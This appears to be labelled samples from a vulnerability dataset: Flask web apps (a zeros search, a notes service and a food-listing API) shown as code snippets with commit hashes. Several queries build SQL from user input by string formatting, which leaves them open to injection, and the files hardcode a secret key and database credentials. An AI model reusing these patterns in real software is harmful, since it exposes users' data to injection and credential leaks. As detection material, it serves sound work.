#print data_location


@FirstZeros.route(""/"")
def firstzeros():
    start = request.args.get('start', None, float)
    end = request.args.get('end', None, float)
    limit = request.args.get('limit', 100, int)
    degree = request.args.get('degree', None, int)
    # signature_r = request.arts.get(""signature_r"", None, int)
    # signature_c = request.arts.get(""signature_c"", None, int)
    if limit > 1000:
        limit = 1000
    if limit < 0:
        limit = 100

    # return render_template(""first_zeros.html"", start=start, end=end,
    # limit=limit, degree=degree, signature_r=signature_r,
    # signature_c=signature_c)
    title = ""Search for First Zeros of L-functions""
    bread=[(""L-functions"", url_for(""l_functions.l_function_top_page"")), (""First Zeros Search"", "" ""), ]
    return render_template(""first_zeros.html"",
                           start=start, end=end, limit=limit,
                           degree=degree, title=title, bread=bread)


@FirstZeros.route(""/list"")
def list_zeros(start=None,
               end=None,
               limit=None,
               fmt=None,
               download=None,
               degree=None):
               # signature_r = None,
               # signature_c = None):
    if start is None:
        start = request.args.get('start', None, float)
    if end is None:
        end = request.args.get('end', None, float)
    if limit is None:
        limit = request.args.get('limit', 100, int)
    if fmt is None:
        fmt = request.args.get('format', 'plain', str)
    if download is None:
        fmt = request.args.get('download', 'no')
    if degree is None:
        degree = request.args.get('degree', None, int)
    # if signature_r is None:
    #    signature_r = request.arts.get(""signature_r"", None, int)
    # if signature_c is None:
    #    signature_c = request.arts.get(""signature_c"", None, int)
    if limit > 1000:
        limit = 1000
    if limit < 0:
        limit = 100

    if start is None and end is None:
        end = 1000

    limit = int(limit)

    where_clause = 'WHERE 1=1 '

    if end is not None:
        end = str(end)
        # fix up rounding errors, otherwise each time you resubmit the page you will lose one line
        if('.' in end): end = end+'999'

    if start is None:
        where_clause += ' AND zero <= ' + end
    elif end is None:
        start = float(start)
        where_clause += ' AND zero >= ' + str(start)
    else:
        where_clause += ' AND zero >= {} AND zero <= {}'.format(start, end)

    if degree is not None and degree != '':
        where_clause += ' AND degree = ' + str(degree)

    if end is None:
        query = 'SELECT * FROM (SELECT * FROM zeros {} ORDER BY zero ASC LIMIT {}) ORDER BY zero DESC'.format(
            where_clause, limit)
    else:
        query = 'SELECT * FROM zeros {} ORDER BY zero DESC LIMIT {}'.format(where_clause, limit)

    #print query
    c = sqlite3.connect(data_location + 'first_zeros.db').cursor()
    c.execute(query)

    response = flask.Response(("" "".join([str(x) for x in row]) + ""\n"" for row in c))
    response.headers['content-type'] = 'text/plain'
    if download == ""yes"":
        response.headers['content-disposition'] = 'attachment; filename=zetazeros'
    # response = flask.Response( (""1 %s\n"" % (str(row[0]),) for row in c) )
    return response
/n/n/n",1
66,66,e96fbd2bce5d10612be93170b1bf953f27dd77b6,"application.py/n/nfrom flask import Flask, render_template, redirect, url_for, request, session, flash, abort, send_from_directory
from werkzeug.utils import secure_filename
from db import db_init, dao
from time import sleep
import random, os, uuid

app = Flask(__name__)
app.secret_key = 'Gusnq4H7S2O0A-v=2FmaueE>obi/An8yP(DFdk%m1a5ob'
db_init.database_init()
app.config['UPLOAD_FOLDER'] = 'upload/'
if not os.path.isdir(os.path.join(app.config['UPLOAD_FOLDER'])):
    os.mkdir(os.path.join(app.config['UPLOAD_FOLDER']))

@app.route('/index')
def index():
    verify_session_id()
    return render_template('index.html', username=session.get('usr'), notesList=session.get('nl'))


@app.route('/login', methods=['GET', 'POST'])
def login(error = None):
    if request.method == 'GET':
        return render_template('login.html', error=error)
    else:
        usr = request.form.get('username')
        pwd = request.form.get('password')

        if authenticated_correctly(usr, pwd):
            return redirect(url_for('index'))
        else:
            return render_template('login.html', error='Nieprawidłowa nazwa użytkownika lub hasło')


@app.route('/logout', methods=['GET'])
def logout():
    dao.logout(session.get('sid'))
    session.clear()
    return redirect(url_for('index'))


@app.route('/signin', methods=['POST', 'GET'])
def signin():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if validate_signin(username, password):
            dao.add_user(username, password)
            flash('Pomyślnie utworzono nowe konto')
            return redirect(url_for('index'))
        print('New user not valid')
        return redirect(url_for('signin'))
    if request.method == 'GET':
        verify_session_id()
        return render_template('signin.html', username=session.get('usr'))


@app.route('/api/checkUsername', methods=['POST'])
def check_username():
    username = request.get_json().get('username')
    if not username.isalnum() or dao.is_username_taken(username):
        return 'T'
    else:
        return 'F'


@app.route('/view/<string:file_id>', methods=['GET'])
def view_notes(file_id):
    if not verify_note_access(file_id):
        abort(403)

    with open(os.path.join(app.config.get('UPLOAD_FOLDER'), file_id+'.txt'), 'r') as file:
        note_content = file.read()

    note_data = None

    for note in session.get('nl'):
        if note.get('file_id') == file_id:
            note_data = note
    return render_template('note.html', note=note_data, note_content=note_content)


@app.route('/upload', methods=['POST'])
def upload_notes():
    verify_session_id()
    file = request.files.get('file')
    username = session.get('usr')
    if file and username:
        file_id = str(uuid.uuid4())
        while dao.is_note_uuid_taken(file_id):
            file_id = str(uuid.uuid4())

        secure_fname = secure_filename(file.filename)
        uuid_filename = file_id + '.txt'
        file.save(os.path.join(app.config.get('UPLOAD_FOLDER'), uuid_filename))
        dao.add_notes(secure_fname, file_id, username)

        notes_list = session.get('nl', [])
        notes_list.append({
            ""file_id"": file_id,
            ""name"": secure_fname
        })
        session['nl'] = notes_list
    return redirect(url_for('index'))


@app.route('/download/<string:file_id>')
def download_notes(file_id):
    verify_session_id()
    if not verify_note_access(file_id):
        abort(403)
    filename = dao.get_secure_filename(file_id)
    return send_from_directory(directory=app.config['UPLOAD_FOLDER'], filename=file_id+'.txt',
                               attachment_filename=filename, as_attachment=True)


def authenticated_correctly(username, password):
    if not username.isalnum():
        return False
    session_id, notes = dao.login(username, password)
    delay = random.randint(420, 850)/1000
    sleep(delay)
    if session_id:
        session['sid'] = session_id
        session['usr'] = username
        session['nl'] = notes
        session.modified = True
        return True
    else:
        return False


def validate_signin(username, password):
    return username.isalnum() and len(password) >= 8 \
        and len(username) >= 5 \
        and any(char.isdigit() for char in password) \
        and any(char.isupper() for char in password) \
        and any(char.islower() for char in password) \
        and not dao.is_username_taken(username)


def verify_session_id():
    session_id = session.get('sid')
    if session_id:
        verified_sid = dao.check_session(session_id)
        if not verified_sid:
            session.clear()


def verify_note_access(file_id):
    return dao.confirm_owner_of_file(file_id, session.get('sid'), session.get('usr'))


if __name__ == '__main__':
    app.run()
/n/n/ndb/dao.py/n/nimport sqlite3, hashlib, random, string, uuid
SALT_LENGTH = 32
DATABASE_PATH = 'db/data.db'

def add_user(username, password):
    salt = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(SALT_LENGTH))
    password_hash = multiple_hash_password(password, salt)
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()

    cursor.execute('''INSERT INTO UserData(username, password_hash, salt) 
                      VALUES (?, ?, ?)''', (username, password_hash, salt))

    connection.commit()
    connection.close()


def login(username, password):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()

    cursor.execute('''SELECT user_id, password_hash, salt FROM UserData WHERE username = ?''', [username])
    data = cursor.fetchone()
    if not data:
        return None
    user_id = data[0]
    password_hash = data[1]
    salt = data[2]
    session_id = None
    notes = []

    if multiple_hash_password(password, salt) == password_hash:
        session_id = str(uuid.uuid4())
        cursor.execute('UPDATE UserData SET session_id = ? WHERE user_id = ?', (session_id, user_id))
        print('SID: '+session_id)
        connection.commit()

        cursor.execute('SELECT secure_name, uuid_filename FROM Notes WHERE user_id = ?', [user_id])
        rows = cursor.fetchall()
        for row in rows:
            notes.append({
                ""file_id"": row[1].split('.')[0],
                ""name"": row[0]
            })
    connection.close()

    return session_id, notes


def logout(session_id):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('UPDATE UserData SET session_id = NULL WHERE session_id = ?', [session_id])
    connection.commit()
    connection.close()


def check_session(session_id):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('SELECT * FROM UserData WHERE session_id = ?', [session_id])
    verified = cursor.fetchone()
    connection.close()
    return verified


def is_username_taken(username):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('SELECT * FROM UserData WHERE username = ?', [username])
    records = cursor.fetchone()
    connection.close()
    return records


def multiple_hash_password(password, salt):
    hash_value = password + salt
    for _ in range(1000):
        hash_value = hashlib.sha3_512((hash_value + password + salt).encode()).hexdigest()
    return hash_value


def is_note_uuid_taken(uuid):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('SELECT * FROM Notes WHERE uuid_filename = ?', [uuid])
    records = cursor.fetchone()
    connection.close()
    return records


def add_notes(secure_fname, file_id, username):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('''INSERT INTO Notes(secure_name, user_id, uuid_filename)
                        VALUES (?, 
                        (SELECT user_id FROM UserData WHERE username = ?),
                         ?)''', (secure_fname, username, file_id))
    connection.commit()
    connection.close()


def confirm_owner_of_file(file_id, session_id, username):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('''SELECT session_id, username FROM UserData WHERE user_id = 
                                (SELECT user_id FROM Notes WHERE uuid_filename = ?)''', [file_id])
    row = cursor.fetchone()
    connection.close()
    return row[0] == session_id and row[1] == username


def get_secure_filename(file_id):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('''SELECT secure_name FROM Notes WHERE uuid_filename = ?''', [file_id])
    row = cursor.fetchone()
    connection.close()
    return row[0]
/n/n/n",0
67,67,e96fbd2bce5d10612be93170b1bf953f27dd77b6,"/db/dao.py/n/nimport sqlite3, hashlib, random, string, uuid
SALT_LENGTH = 32
DATABASE_PATH = 'db/data.db'

def add_user(username, password):
    salt = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(SALT_LENGTH))
    password_hash = multiple_hash_password(password, salt)
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()

    cursor.execute('''INSERT INTO UserData(username, password_hash, salt) 
                      VALUES (?, ?, ?)''', (username, password_hash, salt))

    connection.commit()
    connection.close()


def login(username, password):
    #todo zabezpieczyć username przed SQLinjection
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()

    cursor.execute('''SELECT user_id, password_hash, salt FROM UserData WHERE username = ?''', [username])
    data = cursor.fetchone()
    if not data:
        return None
    user_id = data[0]
    password_hash = data[1]
    salt = data[2]
    session_id = None

    if multiple_hash_password(password, salt) == password_hash:
        session_id = str(uuid.uuid4())
        cursor.execute('UPDATE UserData SET session_id = ? WHERE user_id = ?', (session_id, user_id))
        print('SID: '+session_id)
        connection.commit()

        cursor.execute('SELECT secure_name, uuid_filename FROM Notes WHERE user_id = ?', [user_id])
        notes = []
        rows = cursor.fetchall()
        for row in rows:
            notes.append({
                ""file_id"": row[1].split('.')[0],
                ""name"": row[0]
            })
    connection.close()

    return session_id, notes


def logout(session_id):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('UPDATE UserData SET session_id = NULL WHERE session_id = ?', [session_id])
    connection.commit()
    connection.close()


def check_session(session_id):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('SELECT * FROM UserData WHERE session_id = ?', [session_id])
    verified = cursor.fetchone()
    connection.close()
    return verified


def is_username_taken(username):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('SELECT * FROM UserData WHERE username = ?', [username])
    records = cursor.fetchone()
    connection.close()
    return records


def multiple_hash_password(password, salt):
    hash_value = password + salt
    for _ in range(1000):
        hash_value = hashlib.sha3_512((hash_value + password + salt).encode()).hexdigest()
    return hash_value


def is_note_uuid_taken(uuid):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('SELECT * FROM Notes WHERE uuid_filename = ?', [uuid])
    records = cursor.fetchone()
    connection.close()
    return records


def add_notes(secure_fname, file_id, username):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('''INSERT INTO Notes(secure_name, user_id, uuid_filename)
                        VALUES (?, 
                        (SELECT user_id FROM UserData WHERE username = ?),
                         ?)''', (secure_fname, username, file_id))
    connection.commit()
    connection.close()


def confirm_owner_of_file(file_id, session_id, username):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('''SELECT session_id, username FROM UserData WHERE user_id = 
                                (SELECT user_id FROM Notes WHERE uuid_filename = ?)''', [file_id])
    row = cursor.fetchone()
    connection.close()
    return row[0] == session_id and row[1] == username


def get_secure_filename(file_id):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('''SELECT secure_name FROM Notes WHERE uuid_filename = ?''', [file_id])
    row = cursor.fetchone()
    connection.close()
    return row[0]
/n/n/n",1
78,78,a5c2c0b8d137ca3f1859ce7b65c39b7d461bf615,"backend-api/backend-api.py/n/nfrom flask import Flask
from flask import request
import simplejson as json
import psycopg2

"""""" Macros for relation and column names """"""
client_table_name = ""\""Client\""""
client_client_id_col = ""\""ClientID\""""
client_client_rating_col = ""\""Client Rating\""""

client_ratings_table_name = ""\""Client Ratings\""""
client_ratings_client_id_col = ""\""ClientID\""""
client_ratings_reviewer_id_col = ""\""ReviewerID\""""
client_ratings_comments_col = ""\""Comments\""""
client_ratings_rating_col = ""\""Rating\""""

cook_table_name = ""\""Cook\""""
cook_cook_id_col = ""\""CookID\""""
cook_cook_rating_col = ""\""Cook Rating\""""

cook_ratings_table_name = ""\""Cook Rating\""""
cook_ratings_cook_id_col = ""\""CookID\""""
cook_ratings_reviewer_id_col = ""\""ReviewerID\""""
cook_ratings_comments_col = ""\""Comments\""""
cook_ratings_rating_col = ""\""Rating\""""

listing_table_name = ""\""Listing\""""
listing_listing_id_col = ""\""ListingID\""""
listing_cook_id_col = ""\""CookID\""""
listing_food_name_col = ""\""Food Name\""""
listing_price_col = ""\""Price\""""
listing_location_col = ""\""Location\""""
listing_image_col = ""\""Image\""""

listing_tags_table_name = ""\""Listing Tags\""""
listing_tags_listing_id_col = ""\""ListingID\""""
listing_tags_tag_col = ""\""Tag\""""

order_table_name = ""\""Order\""""
order_client_id_col = ""\""ClientID\""""
order_listing_id_col = ""\""ListingID\""""
order_status_col = ""\""Status\""""
order_time_of_order_col = ""\""Time of Order\""""

user_table_name = ""\""User\""""
user_user_id_col = ""\""UserID\""""
user_password_col = ""\""Password\""""
user_fname_col = ""\""FName\""""
user_lname_col = ""\""LName\""""

"""""" Database login details """"""
db_host = ""mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com""
db_name = ""csc301breadwiener""
db_user = ""csc301breadwiener""
db_password = ""team7ithink""

conn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)
app = Flask(__name__)

##################################################
def removeQuotes(stringy):
    """""" Removes the first and last characters (double quotes) from a string, and then return it """"""
    return stringy[1:-1]


#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#
@app.route('/api/getAllListings', methods=['GET'])
def getAllListings():
    all_rows = []

    search_all = conn.cursor()
    search_all.execute(""SELECT {}, {}, {}, {},""
                         "" {}, {} FROM public.{}"".format(listing_listing_id_col,
                                                                          listing_cook_id_col,
                                                                          listing_food_name_col,
                                                                          listing_price_col,
                                                                          listing_location_col,
                                                                          listing_image_col,
                                                                          listing_table_name))

    single_row = search_all.fetchone()

    while single_row is not None:
        all_rows.append(single_row)
        single_row = search_all.fetchone()

    search_all.close()

    rows_to_json(all_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': all_rows})  # convert to string before returning


#--------------------------------------------------- ADD LISTING ---------------------------------------------------#

@app.route('/api/add', methods=['GET', 'POST'])
def addReq():
    if request.method == ""GET"":
        return printTables()
    elif request.method == ""POST"":
        addToDB(request.get_json())
        conn.commit()
        return ""Success""

def encase_in_quotes(stringy):
    return ""\"""" + stringy + ""\""""


""""""
Adds the Listing entry to the PSQL database with the given JSONdata
JSON format is a dictionary where the keys are the column names of the listing, along with
a key ""tagList"" which is a list of tags:

""""""


def addToDB(json_data):
    cur = conn.cursor()
    json_dict = json_data

    list_id = getListId()
    cook_id = json_dict[removeQuotes(listing_cook_id_col)]
    food_name = json_dict[removeQuotes(listing_food_name_col)]
    price = json_dict[removeQuotes(listing_price_col)]
    loc = json_dict[removeQuotes(listing_location_col)]
    image = json_dict[removeQuotes(listing_image_col)]
    tags = json_dict[""tags""]

    sql = ""INSERT INTO %s VALUES (%s, %s, %s, %s, %s, %s)""
	cur.execute(sql, (listing_table_name, list_id, cook_id, food_name, price, loc, image))

    addTags(tags, list_id)


def addTags(tag_list, listing_id):
    """"""
    Adds a list of tags tag_list for a given listing with listing_id to the database
    """"""
    cur = conn.cursor()
    for x in tag_list:
        sql = ""INSERT INTO {} VALUES {}"".format(listing_tags_table_name, str((listing_id, x)))
        cur.execute(sql)


def getListId():
    """""" Returns an unused listing_id """"""
    cur = conn.cursor()
    sql = ""SELECT max({}) FROM {}"".format(listing_listing_id_col,
                                          listing_table_name)
    cur.execute(sql)
    maxID = cur.fetchone()
    if maxID[0] == None:
        return 1
    else:
        return maxID[0] + 1


def printTables():
    cur = conn.cursor()
    strout = ""--------------------------ListingTable---------------------------<br>""
    sql = ""SELECT * FROM {}"".format(listing_table_name)
    cur.execute(sql)
    listings = cur.fetchall()
    for x in listings:
        for y in x:
            strout = strout + str(y) + ""||	""
        strout = strout + ""<br>""
    sql = ""SELECT * FROM {}"".format(listing_tags_table_name)
    cur.execute(sql)
    listings = cur.fetchall()
    strout += ""<br><br><br>--------------------------TagTable-------------------------<br>""
    for x in listings:
        for y in x:
            strout = strout + str(y) + ""	""

        strout = strout + ""<br>""
    return strout


#--------------------------------------------------- CANCEL ---------------------------------------------------#


@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])
def cancel(clientId, listingId):
    """"""
    Cancels the order with specified client id and listing id and returns it.
    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already
    been canceled or fulfilled.
    """"""

    in_progress = get_in_progress_order(clientId, listingId)

    if in_progress:
        cancel_order(clientId, listingId)
        output = order_to_json(in_progress)  # want to convert each row into a JSON string

        return output  # convert to string before returning
    else:
        return 'order not found'


def get_in_progress_order(clientId, listingId):
    """"""
    Return the in progress order that corresponds with ClientId and ListingID
    """"""
    matched_rows = []

    order = conn.cursor()
    order.execute(""SELECT t1.\""ClientID\"", t1.\""ListingID\"", t1.\""Status\"", t1.\""Time of Order\"" from public.\""Order\""""
                  "" as t1 WHERE t1.\""ClientID\"" = "" + str(clientId) + "" AND \""ListingID\"" = "" + str(listingId) +
                  "" AND t1.\""Status\"" = \'In progress\'"")

    order_row = order.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = order.fetchone()

    order.close()

    return matched_rows


def cancel_order(clientId, listingId):
    """"""
    given a clientId and listingId cancel the order in progress associated with them
    """"""
    order = conn.cursor()
    order.execute(
        ""UPDATE public.\""Order\"" SET \""Status\"" = 'Canceled' WHERE \""ClientID\"" = "" + str(clientId) +
        "" AND \""ListingID\"" = "" + str(listingId) + "" AND \""Status\"" = \'In progress\'"")
    conn.commit()

    order.close()


def order_to_json(rows):
    """"""
    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.
    """"""
    string = """"
    for i in range(len(rows)):
        string += json.dumps({'ClientID': rows[i][0],
                              'ListingID': rows[i][1],
                              'Status': rows[i][2],
                              'DateTime': rows[i][3].__str__()})
        if i != len(rows) - 1:
            string += "",""

    return string


#--------------------------------------------------- getUserOrders ---------------------------------------------------#


@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])
def getUserOrders(clientId):
    """"""
    Retruns a list of jsons representing tupples in the Orders table for the given client
    """"""

    in_progress = queryOrderUsingClientID(clientId)

    output = order_to_json(in_progress)  # want to convert each row into a JSON string

    return ""["" + output + ""]""  # convert to string before returning


def queryOrderUsingClientID(clientId):
    """"""
    Return a list of Order tuples belonging to the client with the given id.
    """"""
    matched_rows = []

    orders = conn.cursor()
    orders.execute(""SELECT t1.\""ClientID\"", t1.\""ListingID\"", t1.\""Status\"", t1.\""Time of Order\"" from public.\""Order\""""
                   "" as t1 WHERE t1.\""ClientID\"" = "" + str(clientId))

    order_row = orders.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = orders.fetchone()

    orders.close()

    return matched_rows


#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#


completed = ""\'Completed\'""


@app.route(""/api/markComplete/<int:clientID>/<int:listingID>"", methods=['GET'])
def mark_as_complete(clientID, listingID):
    """""" A function that changes the status of the order with listing id listing_id to complete.
        Returns ""Success"" on a sucessful change of the listing id's order to complete.

        @param clientID: the client id number to change the status.
        @param listingID: the listing id number to change the status.
        @rtype: str
    """"""

    sql = \
        """"""
            UPDATE public.{}
            SET {} = {}
            WHERE {} = {} AND {} = {}
        """""".format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),
                   order_client_id_col, str(clientID))

    cur = conn.cursor()
    try:
        cur.execute(sql)
        conn.commit()
    except Exception as e:
        raise Exception(e)

    # Check to see if a row in the database has been updated.
    if cur.rowcount == 0:
        raise Exception(""The status of listing id's order was not changed. ClientID or ListingID may be out of range."")
    return ""Success""


#--------------------------------------------------- SEARCH ---------------------------------------------------#


@app.route('/api/search/<string:search_query>', methods=['GET'])
def search(search_query):
    """"""
    Return a string representation of a list of JSON objects. This list contains
    objects that correspond to listings that match names or tags in the search query.
    """"""
    # separate words in search_query with '+' in place of spaces
    search_terms = search_query.split('+')

    # want to remove whitespace and empty elements from the list
    search_terms_filtered = []

    for search_term in search_terms:
        if not search_term.isspace() and not search_term == '':
            search_terms_filtered.append(search_term)

    matched_rows_by_name = get_rows_from_name(search_terms_filtered)

    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)

    matched_rows = matched_rows_by_name + matched_rows_by_tag

    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows

    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': unique_matched_rows})  # convert to string before returning


def get_rows_from_name(search_terms):
    """"""
    Return a list of listing tuples whose Food Names correspond to words in search_terms.
    """"""
    matched_rows = []

    for search_term in search_terms:
        search_names = conn.cursor()
        search_names.execute(""SELECT t1.{}, t1.{}, t1.{}, t1.{},""
                             "" t1.{}, t1.{} FROM public.{} as t1""
                             "" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} ""
                             ""WHERE UPPER(t1.{}) LIKE UPPER(\'%{}%\')"".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_food_name_col,
                                                                              search_term))

        search_names_row = search_names.fetchone()

        while search_names_row is not None:
            matched_rows.append(search_names_row)
            search_names_row = search_names.fetchone()

        search_names.close()

    return matched_rows


def get_rows_from_tag(search_terms):
    """"""
    Return a list of listing tuples whose tags correspond to words in search_terms.
    """"""
    matched_rows = []

    for search_term in search_terms:
        search_tags = conn.cursor()
        search_tags.execute(""SELECT t1.{}, t1.{}, t1.{}, t1.{},""
                             "" t1.{}, t1.{} FROM public.{} as t1""
                             "" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} ""
                             ""WHERE UPPER(t2.{}) LIKE UPPER(\'%{}%\')"".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_tags_tag_col,
                                                                              search_term))

        search_tags_row = search_tags.fetchone()

        while search_tags_row is not None:
            matched_rows.append(search_tags_row)
            search_tags_row = search_tags.fetchone()

        search_tags.close()

    return matched_rows


def rows_to_json(rows):
    """"""
    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.
    """"""
    for i in range(len(rows)):
        rows[i] = json.dumps({'ListingID': rows[i][0],
                                'CookID': rows[i][1],
                                'Food Name': rows[i][2],
                                'Price': rows[i][3],
                                'Location': rows[i][4],
                                'Image': rows[i][5]})


if __name__ == '__main__':
    app.run(host=""0.0.0.0"", port=80)
    # host=""0.0.0.0"", port=80
/n/n/n",0
79,79,a5c2c0b8d137ca3f1859ce7b65c39b7d461bf615,"/backend-api/backend-api.py/n/nfrom flask import Flask
from flask import request
import simplejson as json
import psycopg2

"""""" Macros for relation and column names """"""
client_table_name = ""\""Client\""""
client_client_id_col = ""\""ClientID\""""
client_client_rating_col = ""\""Client Rating\""""

client_ratings_table_name = ""\""Client Ratings\""""
client_ratings_client_id_col = ""\""ClientID\""""
client_ratings_reviewer_id_col = ""\""ReviewerID\""""
client_ratings_comments_col = ""\""Comments\""""
client_ratings_rating_col = ""\""Rating\""""

cook_table_name = ""\""Cook\""""
cook_cook_id_col = ""\""CookID\""""
cook_cook_rating_col = ""\""Cook Rating\""""

cook_ratings_table_name = ""\""Cook Rating\""""
cook_ratings_cook_id_col = ""\""CookID\""""
cook_ratings_reviewer_id_col = ""\""ReviewerID\""""
cook_ratings_comments_col = ""\""Comments\""""
cook_ratings_rating_col = ""\""Rating\""""

listing_table_name = ""\""Listing\""""
listing_listing_id_col = ""\""ListingID\""""
listing_cook_id_col = ""\""CookID\""""
listing_food_name_col = ""\""Food Name\""""
listing_price_col = ""\""Price\""""
listing_location_col = ""\""Location\""""
listing_image_col = ""\""Image\""""

listing_tags_table_name = ""\""Listing Tags\""""
listing_tags_listing_id_col = ""\""ListingID\""""
listing_tags_tag_col = ""\""Tag\""""

order_table_name = ""\""Order\""""
order_client_id_col = ""\""ClientID\""""
order_listing_id_col = ""\""ListingID\""""
order_status_col = ""\""Status\""""
order_time_of_order_col = ""\""Time of Order\""""

user_table_name = ""\""User\""""
user_user_id_col = ""\""UserID\""""
user_password_col = ""\""Password\""""
user_fname_col = ""\""FName\""""
user_lname_col = ""\""LName\""""

"""""" Database login details """"""
db_host = ""mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com""
db_name = ""csc301breadwiener""
db_user = ""csc301breadwiener""
db_password = ""team7ithink""

conn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)
app = Flask(__name__)

##################################################
def removeQuotes(stringy):
    """""" Removes the first and last characters (double quotes) from a string, and then return it """"""
    return stringy[1:-1]


#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#
@app.route('/api/getAllListings', methods=['GET'])
def getAllListings():
    all_rows = []

    search_all = conn.cursor()
    search_all.execute(""SELECT {}, {}, {}, {},""
                         "" {}, {} FROM public.{}"".format(listing_listing_id_col,
                                                                          listing_cook_id_col,
                                                                          listing_food_name_col,
                                                                          listing_price_col,
                                                                          listing_location_col,
                                                                          listing_image_col,
                                                                          listing_table_name))

    single_row = search_all.fetchone()

    while single_row is not None:
        all_rows.append(single_row)
        single_row = search_all.fetchone()

    search_all.close()

    rows_to_json(all_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': all_rows})  # convert to string before returning


#--------------------------------------------------- ADD LISTING ---------------------------------------------------#

@app.route('/api/add', methods=['GET', 'POST'])
def addReq():
    if request.method == ""GET"":
        return printTables()
    elif request.method == ""POST"":
        addToDB(request.get_json())
        conn.commit()
        return ""Success""

def encase_in_quotes(stringy):
    return ""\"""" + stringy + ""\""""


""""""
Adds the Listing entry to the PSQL database with the given JSONdata
JSON format is a dictionary where the keys are the column names of the listing, along with
a key ""tagList"" which is a list of tags:

""""""


def addToDB(json_data):
    cur = conn.cursor()
    json_dict = json_data

    list_id = getListId()
    cook_id = json_dict[removeQuotes(listing_cook_id_col)]
    food_name = json_dict[removeQuotes(listing_food_name_col)]
    price = json_dict[removeQuotes(listing_price_col)]
    loc = json_dict[removeQuotes(listing_location_col)]
    image = json_dict[removeQuotes(listing_image_col)]
    tags = json_dict[""tags""]

    inserted = (list_id, cook_id, food_name, price, loc, image)
    #inserted = '(' + list_id + ',' + cook_id + ',' + food_name + ',' + price + ',' + loc + ',' + image + ')'

    sql = ""INSERT INTO {} VALUES {}"".format(listing_table_name, str(inserted).encode(""ascii"", ""replace""))
    cur.execute(sql)

    addTags(tags, list_id)


def addTags(tag_list, listing_id):
    """"""
    Adds a list of tags tag_list for a given listing with listing_id to the database
    """"""
    cur = conn.cursor()
    for x in tag_list:
        sql = ""INSERT INTO {} VALUES {}"".format(listing_tags_table_name, str((listing_id, x)))
        cur.execute(sql)


def getListId():
    """""" Returns an unused listing_id """"""
    cur = conn.cursor()
    sql = ""SELECT max({}) FROM {}"".format(listing_listing_id_col,
                                          listing_table_name)
    cur.execute(sql)
    maxID = cur.fetchone()
    if maxID[0] == None:
        return 1
    else:
        return maxID[0] + 1


def printTables():
    cur = conn.cursor()
    strout = ""--------------------------ListingTable---------------------------<br>""
    sql = ""SELECT * FROM {}"".format(listing_table_name)
    cur.execute(sql)
    listings = cur.fetchall()
    for x in listings:
        for y in x:
            strout = strout + str(y) + ""||	""
        strout = strout + ""<br>""
    sql = ""SELECT * FROM {}"".format(listing_tags_table_name)
    cur.execute(sql)
    listings = cur.fetchall()
    strout += ""<br><br><br>--------------------------TagTable-------------------------<br>""
    for x in listings:
        for y in x:
            strout = strout + str(y) + ""	""

        strout = strout + ""<br>""
    return strout


#--------------------------------------------------- CANCEL ---------------------------------------------------#


@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])
def cancel(clientId, listingId):
    """"""
    Cancels the order with specified client id and listing id and returns it.
    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already
